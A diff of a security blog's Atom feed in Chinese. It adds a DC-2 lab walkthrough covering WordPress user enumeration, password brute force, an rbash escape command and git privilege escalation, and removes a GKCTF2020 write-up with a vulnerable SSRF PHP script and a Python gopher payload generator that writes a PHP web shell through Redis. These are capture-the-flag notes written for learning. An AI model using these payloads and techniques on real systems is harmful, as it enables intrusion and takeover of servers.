@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://ev11ccaatt.github.io</id>
     <title>ev11ccaatt</title>
-    <updated>2021-04-15T12:54:51.380Z</updated>
+    <updated>2021-04-17T06:42:12.775Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://ev11ccaatt.github.io"/>
     <link rel="self" href="https://ev11ccaatt.github.io/atom.xml"/>
@@ -10,6 +10,30 @@
     <logo>https://ev11ccaatt.github.io/images/avatar.png</logo>
     <icon>https://ev11ccaatt.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, ev11ccaatt</rights>
+    <entry>
+        <title type="html"><![CDATA[DC-2]]></title>
+        <id>https://ev11ccaatt.github.io/post/dc-2/</id>
+        <link href="https://ev11ccaatt.github.io/post/dc-2/">
+        </link>
+        <updated>2021-04-17T06:41:55.000Z</updated>
+        <content type="html"><![CDATA[<p>老样子，上来先扫下ip和端口。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417140033907.png" alt="image-20210417140033907" loading="lazy"></figure>
+<p>这里需要注意的一点是ssh开在了7744，突破口貌似还在80网页。</p>
+<p>这里需要在hosts添加一条解析才能正常访问</p>
+<p>先看到flag，里面提到了flag1<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417140633487.png" alt="image-20210417140633487" loading="lazy"></p>
+<p>先用wpscan跑下用户名<img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210417140802601.png" alt="image-20210417140802601" loading="lazy"></p>
+<p>然后用cewl来生成字典<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417141007351.png" alt="image-20210417141007351" loading="lazy">，貌似是遍历网站来生成字典。</p>
+<p>那么直接用wpscan打一下。<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417141452188.png" alt="image-20210417141452188" loading="lazy">有俩，那么去登录吧。</p>
+<p>登录jerry的账号，在page页面找到第二个flag<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417141758345.png" alt="image-20210417141758345" loading="lazy"></p>
+<p>说是wordpress无路可走了，那么想到开头那个奇怪的端口，试试用两个用户去ssh一下。</p>
+<p>cat flag3但是提示<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417142144816.png" alt="image-20210417142144816" loading="lazy">，在<a href="https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/">Restricted Linux Shell Escaping Techniques | FireShell Security Team</a>找到解决方法，用 BASH_CMDS[a]=/bin/sh;a /bin/bash 来绕过rbash，然后用 export PATH=PATH:/bin:/sbin:/usr/bin:/usr/sbin 来设置环境变量。</p>
+<p>这时候就能有正常的指令了，先看flag3<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417143550090.png" alt="image-20210417143550090" loading="lazy"></p>
+<p>切换到jerry，在/home/jerry下找到flag4,<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417143710184.png" alt="image-20210417143710184" loading="lazy"></p>
+<p>让我们用git提权，<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417144045098.png" alt="image-20210417144045098" loading="lazy">，<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417144102323.png" alt="image-20210417144102323" loading="lazy"></p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417144125359.png" alt="image-20210417144125359" loading="lazy"></figure>
+<p>收工，下班。</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Dc-1]]></title>
         <id>https://ev11ccaatt.github.io/post/dc-1/</id>
@@ -224,84 +248,6 @@ for i in range(1,1000):
         <content type="html"><![CDATA[<p>简单的thinkphp漏洞<br>
 5.0.23洞直接打<br>
 不多说</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[GKCTF2020]EZ三剑客-EzWeb]]></title>
-        <id>https://ev11ccaatt.github.io/post/gkctf2020ez-san-jian-ke-ezweb/</id>
-        <link href="https://ev11ccaatt.github.io/post/gkctf2020ez-san-jian-ke-ezweb/">
-        </link>
-        <updated>2021-03-30T10:03:13.000Z</updated>
-        <content type="html"><![CDATA[<p>进去先看源码提示?serect，随便传入试试得到。</p>
-<pre><code>eth0 Link encap:Ethernet HWaddr 02:42:0a:00:7f:09 inet addr:10.0.127.9 Bcast:10.0.127.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1450 Metric:1 RX packets:51 errors:0 dropped:0 overruns:0 frame:0 TX packets:48 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:11820 (11.8 KB) TX bytes:9298 (9.2 KB) eth1 Link encap:Ethernet HWaddr 52:54:00:9b:70:fe inet addr:10.128.0.92 Bcast:10.128.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:4 errors:0 dropped:0 overruns:0 frame:0 TX packets:17 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:196 (196.0 B) TX bytes:1194 (1.1 KB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:30 errors:0 dropped:0 overruns:0 frame:0 TX packets:30 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:2596 (2.5 KB) TX bytes:2596 (2.5 KB)
-</code></pre>
-<p>带ip，那么可能就是个ssrf,先看下源码，用file去读.</p>
-<p>但file:///var%2Fwww%2Fhtml%2Findex.php&amp;submit=%E6%8F%90%E4%BA%A4 被过滤,试试file:/var和</p>
-<p>file: ///var来绕过,都成功了.</p>
-<pre><code>&lt;?php
-function curl($url){  
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_HEADER, 0);
-    echo curl_exec($ch);
-    curl_close($ch);
-}
-
-if(isset($_GET['submit'])){
-		$url = $_GET['url'];
-		//echo $url.&quot;\n&quot;;
-		if(preg_match('/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is', $url,$match))
-		{
-			//var_dump($match);
-			die('别这样');
-		}   
-		curl($url);
-}
-if(isset($_GET['secret'])){
-	system('ifconfig');
-}
-?&gt;
-</code></pre>
-<p>过滤了file，dict，127.0.0.1和localhost。还有http和gopher。</p>
-<p>那么先http协议扫描ip，用burp配合扫描，得到10.0.127.11是有提示的。而ssrf通常是对6379端口的redis进行攻击.<br>
-扫到10.0.127.11:6379是存在服务的.<br>
-然后用gopher来写shell。</p>
-<pre><code>vimport urllib
-protocol=&quot;gopher://&quot;
-ip=&quot;10.0.127.11&quot;      // 运行有redis的主机ip
-port=&quot;6379&quot;
-shell=&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;
-filename=&quot;shell.php&quot;
-path=&quot;/var/www/html&quot;
-passwd=&quot;&quot;
-cmd=[&quot;flushall&quot;,
-	 &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
-	 &quot;config set dir {}&quot;.format(path),
-	 &quot;config set dbfilename {}&quot;.format(filename),
-	 &quot;save&quot;
-	 ]
-if passwd:
-	cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
-payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
-def redis_format(arr):
-	CRLF=&quot;\r\n&quot;
-	redis_arr = arr.split(&quot; &quot;)
-	cmd=&quot;&quot;
-	cmd+=&quot;*&quot;+str(len(redis_arr))
-	for x in redis_arr:
-		cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
-	cmd+=CRLF
-	return cmd
-
-if __name__==&quot;__main__&quot;:
-	for x in cmd:
-		payload += urllib.quote(redis_format(x))
-	print payload
-来自互联网
-</code></pre>
-<p>在栏中输入payload（这里我等了一会，就直接burp发了)</p>
-<p>随后访问http://10.0.127.11/shell.php</p>
-<p>得到flag.</p>
 ]]></content>
     </entry>
 </feed>
